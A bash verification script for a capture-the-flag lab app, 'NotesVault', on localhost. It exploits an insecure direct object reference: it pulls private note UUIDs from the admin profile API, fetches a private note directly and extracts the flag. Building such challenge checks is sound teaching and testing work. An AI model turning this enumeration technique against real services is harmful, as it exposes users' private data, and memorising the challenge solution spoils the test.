#!/bin/bash

echo "========================================"
echo "NotesVault CTF - Verification Script"
echo "========================================"
echo ""

# Check if app is running
echo "[*] Checking if application is running..."
if curl -s http://localhost:3000 > /dev/null 2>&1; then
    echo "✓ Application is running at http://localhost:3000"
else
    echo "✗ Application is not running!"
    echo "  Please start it first: ./start.sh or docker-compose up"
    exit 1
fi

echo ""
echo "[*] Testing vulnerability..."
echo ""

# Test the IDOR vulnerability
echo "1. Fetching admin profile via API..."
RESPONSE=$(curl -s http://localhost:3000/api/profile/admin)

if echo "$RESPONSE" | grep -q "admin"; then
    echo "   ✓ API accessible"
else
    echo "   ✗ Failed to fetch profile"
    exit 1
fi

# Check for private notes
PRIVATE_COUNT=$(echo "$RESPONSE" | grep -o '"is_public":0' | wc -l)
echo ""
echo "2. Analyzing response..."
echo "   Private notes found: $PRIVATE_COUNT"

if [ "$PRIVATE_COUNT" -gt 0 ]; then
    echo "   ✓ IDOR vulnerability present (private UUIDs leaked)"
else
    echo "   ✗ No private notes found"
fi

# Extract a private UUID
PRIVATE_UUID=$(echo "$RESPONSE" | grep -A3 '"is_public":0' | grep '"uuid"' | head -1 | sed 's/.*"uuid":"\([^"]*\)".*/\1/')

if [ ! -z "$PRIVATE_UUID" ]; then
    echo ""
    echo "3. Testing direct access to private note..."
    echo "   UUID: $PRIVATE_UUID"
    
    NOTE_RESPONSE=$(curl -s "http://localhost:3000/notes?uuid=$PRIVATE_UUID")
    
    if echo "$NOTE_RESPONSE" | grep -q "FLAG{"; then
        FLAG=$(echo "$NOTE_RESPONSE" | grep -o 'FLAG{[^}]*}')
        echo ""
        echo "   ✓ Successfully accessed private note!"
        echo ""
        echo "========================================"
        echo "FLAG FOUND: $FLAG"
        echo "========================================"
        echo ""
        echo "✓ Vulnerability confirmed!"
        echo "  Both IDOR vulnerabilities are exploitable."
    else
        echo "   ⚠ Note accessible but flag not found"
    fi
else
    echo ""
    echo "   ⚠ Could not extract private UUID"
fi

echo ""
echo "To manually test:"
echo "  1. Visit http://localhost:3000/public"
echo "  2. Click on 'admin' profile"
echo "  3. Open DevTools (F12) > Network tab"
echo "  4. Check the API response"
echo ""
